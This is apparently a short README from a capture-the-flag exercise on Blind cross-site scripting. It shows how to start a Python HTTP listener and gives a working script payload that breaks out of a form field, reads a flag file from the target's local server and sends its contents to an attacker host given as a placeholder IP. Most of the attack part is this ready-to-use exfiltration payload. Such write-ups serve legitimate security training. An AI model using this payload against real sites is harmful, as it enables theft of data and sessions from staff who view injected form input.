# Blind-XSS-Script
This behavior introduces a Blind XSS vulnerability, as any malicious JavaScript injected through the form is executed on the staff’s side, potentially compromising sensitive data or functionality.
Exploitation Process

1. Setting Up the Listener

To capture the exfiltrated data, an HTTP server was set up on the attacker’s machine:
```html

python3 -m http.server 8000
```

This server listens for incoming requests, which will contain the sensitive data exfiltrated from the target.

2. Crafting the Exploit Payload

The goal of the exploit was twofold:

    Retrieve the flag located at http://127.0.0.1:8080/flag.txt.
    Exfiltrate the data to the attacker’s HTTP server.

The crafted payload was as follows:

## XSS Payloads
```html
'"><script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://<YOUR-IP-ADDRESS>:8000/?flag=' + encodeURIComponent(data));
    });
</script>
```


The payload first fetches the flag from the target server, encodes it to ensure safe transmission, and sends it to the attacker’s server via a GET request.

The flag.txt is base64 encoded. To decode it, you can use the terminal or visit dencode.com, paste your encoded string, and retrieve the flag.
